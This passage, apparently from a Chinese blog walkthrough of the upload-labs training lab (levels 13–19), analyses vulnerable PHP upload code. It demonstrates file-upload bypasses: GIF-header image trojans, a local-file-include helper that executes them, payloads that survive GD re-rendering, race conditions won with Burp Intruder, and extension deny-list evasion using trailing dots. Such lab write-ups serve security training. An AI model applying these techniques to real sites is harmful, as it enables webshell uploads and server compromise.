<p>十进制转十六进制: <code>gif</code>为47 49 ， <code>png</code>为89 50， <code>jpg</code>为ff d8</p>
</blockquote>
<ul>
<li>关于文件上传后被重命名为图片文件，不能当做<code>php</code>解析，我们可以利用文件包含漏洞</li>
</ul>
<p>这里使用GIF</p>
<ul>
<li>gif文件头为GIF89a</li>
</ul>
<p>构造代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407211550062.png" alt="image-20200407211550062"></p>
<p>将php改为jpg或者gif等能上传的格式，这里改为png</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407211632706.png" alt="image-20200407211632706"></p>
<p>上传图片，页面返回空白</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407211720783.png" alt="image-20200407211720783"></p>
<p>直接复制图片地址是会出错的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407211800092.png" alt="image-20200407211800092"></p>
<p>所以需要使用到文件包含漏洞</p>
<p>在upload下新建一个php文件</p>
<p>写入简单的提交页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file&#x3D;$_GET[&#39;ccc&#39;];</span><br><span class="line">	include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407213647598.png" alt="image-20200407213647598"></p>
<p>返回页面，复制图片地址，因为我们之前新建的php文件是c.php，提交内容是ccc，所以在页面中输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;c.php?ccc&#x3D;图片名称</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407213901204.png" alt="image-20200407213901204"></p>
<h4 id="upload-labs第十四关"><a href="#upload-labs第十四关" class="headerlink" title="upload-labs第十四关"></a>upload-labs第十四关</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">想要提交那种文件就将文件头标识放到php文本开头</span><br><span class="line"></span><br><span class="line">gif文件头表示GIF89a</span><br><span class="line"></span><br><span class="line">png文件头标识 (8 bytes) 89 50 4e 47 0d 0a 1a 0a</span><br><span class="line"></span><br><span class="line">jpg文件头标识 (2 bytes): ff, d8</span><br></pre></td></tr></table></figure>

<h5 id="查看提示"><a href="#查看提示" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407214334480.png" alt="image-20200407214334480"></p>
<h5 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h5><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>
<p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types &#x3D; &#39;.jpeg|.png|.gif&#39;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info &#x3D; getimagesize($filename);</span><br><span class="line">        $ext &#x3D; image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext))&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $res &#x3D; isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg &#x3D; &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="和上一关相同，只是函数换了一个"><a href="#和上一关相同，只是函数换了一个" class="headerlink" title="和上一关相同，只是函数换了一个"></a>和上一关相同，只是函数换了一个</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407214613459.png" alt="image-20200407214613459"></p>
<h4 id="upload-labs第十五关"><a href="#upload-labs第十五关" class="headerlink" title="upload-labs第十五关"></a>upload-labs第十五关</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">想要提交那种文件就将文件头标识放到php文本开头</span><br><span class="line"></span><br><span class="line">gif文件头表示GIF89a</span><br><span class="line"></span><br><span class="line">png文件头标识 (8 bytes) 89 50 4e 47 0d 0a 1a 0a</span><br><span class="line"></span><br><span class="line">jpg文件头标识 (2 bytes): ff, d8</span><br></pre></td></tr></table></figure>

<h5 id="查看提示-1"><a href="#查看提示-1" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407215126253.png" alt="image-20200407215126253"></p>
<h5 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h5><p>这里使用了<code>exif_imagetype()</code>函数</p>
<p><code>exif_imagetype()</code>函数是php内置函数，用来获取图片类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    &#x2F;&#x2F;需要开启php_exif模块</span><br><span class="line">    $image_type &#x3D; exif_imagetype($filename);</span><br><span class="line">    switch ($image_type) &#123;</span><br><span class="line">        case IMAGETYPE_GIF:</span><br><span class="line">            return &quot;gif&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_JPEG:</span><br><span class="line">            return &quot;jpg&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_PNG:</span><br><span class="line">            return &quot;png&quot;;</span><br><span class="line">            break;    </span><br><span class="line">        default:</span><br><span class="line">            return false;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $res &#x3D; isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg &#x3D; &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="和上一关一样"><a href="#和上一关一样" class="headerlink" title="和上一关一样"></a>和上一关一样</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407222258037.png" alt="image-20200407222258037"></p>
<h4 id="upload-labs第十六关"><a href="#upload-labs第十六关" class="headerlink" title="upload-labs第十六关"></a>upload-labs第十六关</h4><h5 id="查看提示-2"><a href="#查看提示-2" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408081053635.png" alt="image-20200408081053635"></p>
<h5 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h5><p>程序通过imagecreatefromjpeg()函数调用了PHP的GD库(GD库，是php处理图形的扩展库)，对图片进行了转换。</p>
<p>将一个正常显示的图片，上传到服务器。下载被渲染后与原始图片对比，在仍然相同的数据块部分插入WebShell代码，进行上传。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    &#x2F;&#x2F; 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">    $filetype &#x3D; $_FILES[&#39;upload_file&#39;][&#39;type&#39;];</span><br><span class="line">    $tmpname &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line"></span><br><span class="line">    $target_path&#x3D;$UPLOAD_ADDR.basename($filename);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 获得上传文件的扩展名</span><br><span class="line">    $fileext&#x3D; substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext &#x3D;&#x3D; &quot;jpg&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;使用上传的图片生成新的图片</span><br><span class="line">            $im &#x3D; imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im &#x3D;&#x3D; false)&#123;</span><br><span class="line">                $msg &#x3D; &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                &#x2F;&#x2F;给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename &#x3D; strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext &#x3D;&#x3D; &quot;png&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;使用上传的图片生成新的图片</span><br><span class="line">            $im &#x3D; imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im &#x3D;&#x3D; false)&#123;</span><br><span class="line">                $msg &#x3D; &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 &#x2F;&#x2F;给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename &#x3D; strval(rand()).&quot;.png&quot;;</span><br><span class="line">                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload &#x3D; true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext &#x3D;&#x3D; &quot;gif&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;使用上传的图片生成新的图片</span><br><span class="line">            $im &#x3D; imagecreatefromgif($target_path);</span><br><span class="line">            if($im &#x3D;&#x3D; false)&#123;</span><br><span class="line">                $msg &#x3D; &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                &#x2F;&#x2F;给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename &#x3D; strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="上传流程"><a href="#上传流程" class="headerlink" title="上传流程"></a>上传流程</h5><p>准备一张GIF图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408085942785.png" alt="image-20200408085942785"></p>
<p>先上传查看能否上传，成功上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090025138.png" alt="image-20200408090025138"></p>
<p>在命令行使用<code>copy picture/d+ shell.php 2.gif</code>来复制一张带有木马的图片，在进行上传</p>
<p>页面返回成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090025138.png" alt="image-20200408090025138"></p>
<p>打开二次渲染后的图片发现我们插入的<code>&lt;?php  phpinfo(); ?&gt;</code>消失了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090541467.png" alt="image-20200408090541467"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090556017.png" alt="image-20200408090556017"></p>
<p>显然，这样的图片马上传方式失败了。<br> 不过二次渲染会保留一些文件内容不会改变，所以在制作图片马之前，我们先观察二次渲染前后图片不会改变的地方，将其代码写入其中即可绕过二次渲染</p>
<p>经过对比，蓝色区域是不会改变的，在其中写入了<code>&lt;?php phpinfo(); ?&gt;</code>保存，再次进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090816482.png" alt="image-20200408090816482"></p>
<p>页面返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090859802.png" alt="image-20200408090859802"></p>
<p>打开图片查看是否有phpinfo()代码，查看是否被二次渲染掉，上传成功，并没有被渲染掉</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408091006941.png" alt="image-20200408091006941"></p>
<p>不知这一种方法，还有就是自己写一个小代码，里面包含简易提交和一句话木马，将写入的代码二次渲染到图片上去，这样上传后可以直接在页面中查看是否返回成功</p>
<p>在页面中查看是否能返回phpinfo的页面，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408091502290.png" alt="image-20200408091502290"></p>
<h4 id="upload-labs第十七关"><a href="#upload-labs第十七关" class="headerlink" title="upload-labs第十七关"></a>upload-labs第十七关</h4><h5 id="查看提示-3"><a href="#查看提示-3" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408091704597.png" alt="image-20200408091704597"></p>
<h5 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h5><p>代码审计，使用了<code>unlink()</code>函数删除文件。</p>
<p>这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             </span><br><span class="line">             </span><br><span class="line">             unlink($upload_file);</span><br><span class="line">             </span><br><span class="line">             </span><br><span class="line">             $is_upload &#x3D; true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &#39;上传失败！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建一个php文本文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408092257532.png" alt="image-20200408092257532"></p>
<p>上传使用burp抓包发送的intruder模块进行clear$</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408092529967.png" alt="image-20200408092529967"></p>
<p>修改User-Agent将其Add$</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408092612457.png" alt="image-20200408092612457"></p>
<p>设置payloads选择Number，执行次数1000次</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408092657212.png" alt="image-20200408092657212"></p>
<p>点击start attack进行攻击</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408092758617.png" alt="image-20200408092758617"></p>
<p>攻击是在页面输入你之前上传的php文件名字，不断进行刷新</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408093537018.png" alt="image-20200408093537018"></p>
<h4 id="upload-labs第十八关"><a href="#upload-labs第十八关" class="headerlink" title="upload-labs第十八关"></a>upload-labs第十八关</h4><h5 id="查看提示-4"><a href="#查看提示-4" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408093707249.png" alt="image-20200408093707249"></p>
<h5 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h5><p>对文件后缀名做了白名单判断，然后检查文件大小、文件是否存在等等。 将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    require_once(&quot;.&#x2F;myupload.php&quot;);</span><br><span class="line">    $imgFileName &#x3D;time();</span><br><span class="line">    $u &#x3D; new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName);</span><br><span class="line">    $status_code &#x3D; $u-&gt;upload($UPLOAD_ADDR);</span><br><span class="line">    switch ($status_code) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">            $img_path &#x3D; $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            $msg &#x3D; &#39;文件已经被上传，但没有重命名。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -1:</span><br><span class="line">            $msg &#x3D; &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -2:</span><br><span class="line">            $msg &#x3D; &#39;上传失败，上传目录不可写。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -3:</span><br><span class="line">            $msg &#x3D; &#39;上传失败，无法上传该类型文件。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -4:</span><br><span class="line">            $msg &#x3D; &#39;上传失败，上传的文件过大。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -5:</span><br><span class="line">            $msg &#x3D; &#39;上传失败，服务器已经存在相同名称文件。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -6:</span><br><span class="line">            $msg &#x3D; &#39;文件无法上传，文件不能复制到目标目录。&#39;;</span><br><span class="line">            break;      </span><br><span class="line">        default:</span><br><span class="line">            $msg &#x3D; &#39;未知错误！&#39;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;myupload.php</span><br><span class="line">class MyUpload&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  var $cls_arr_ext_accepted &#x3D; array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  &#x2F;** upload()</span><br><span class="line">   **</span><br><span class="line">   ** Method to upload the file.</span><br><span class="line">   ** This is the only method to call outside the class.</span><br><span class="line">   ** @para String name of directory we upload to</span><br><span class="line">   ** @returns void</span><br><span class="line">  **&#x2F;</span><br><span class="line">  function upload( $dir )&#123;</span><br><span class="line">    </span><br><span class="line">    $ret &#x3D; $this-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret &#x3D; $this-&gt;setDir( $dir );</span><br><span class="line">    if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret &#x3D; $this-&gt;checkExtension();</span><br><span class="line">    if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret &#x3D; $this-&gt;checkSize();</span><br><span class="line">    if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; if flag to check if the file exists is set to 1</span><br><span class="line">    </span><br><span class="line">    if( $this-&gt;cls_file_exists &#x3D;&#x3D; 1 )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret &#x3D; $this-&gt;checkFileExists();</span><br><span class="line">      if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; if we are here, we are ready to move the file to destination</span><br><span class="line"></span><br><span class="line">    $ret &#x3D; $this-&gt;move();</span><br><span class="line">    if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; check if we need to rename the file</span><br><span class="line"></span><br><span class="line">    if( $this-&gt;cls_rename_file &#x3D;&#x3D; 1 )&#123;</span><br><span class="line">      $ret &#x3D; $this-&gt;renameFile();</span><br><span class="line">      if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; if we are here, everything worked as planned :)</span><br><span class="line"></span><br><span class="line">    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>页面代码显示补全在www目录下查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408094417117.png" alt="image-20200408094417117"></p>
<p>因此也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408100032030.png" alt="image-20200408100032030"></p>
<h4 id="upload-labs第十九关"><a href="#upload-labs第十九关" class="headerlink" title="upload-labs第十九关"></a>upload-labs第十九关</h4><h5 id="查看提示-5"><a href="#查看提示-5" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408100802057.png" alt="image-20200408100802057"></p>
<h5 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h5><p>黑名单策略，文件名用户可控，文件命名<code>upload-19.php.</code>绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name &#x3D; $_POST[&#39;save_name&#39;];</span><br><span class="line">        $file_ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) &#123; </span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg &#x3D; &#39;上传失败！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg &#x3D; &#39;禁止保存为该类型文件！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>选择one.jpg这个可上传的文件，在保存名称处改为php文件名，不能直接改为one.php因为php是不可上传的文件，以上代码使用黑名单但是没有过滤” . “点等，所以利用Windows的特性直接在文件名后面加上一个” . “点，返回空白图片，复制图片地址</p>
<p>当然不止这一种情况，可以不使用“ . ”直接使用空格也是可以的，因为使用了黑名单但是没有过滤，所以有很多绕过绕过情况</p>
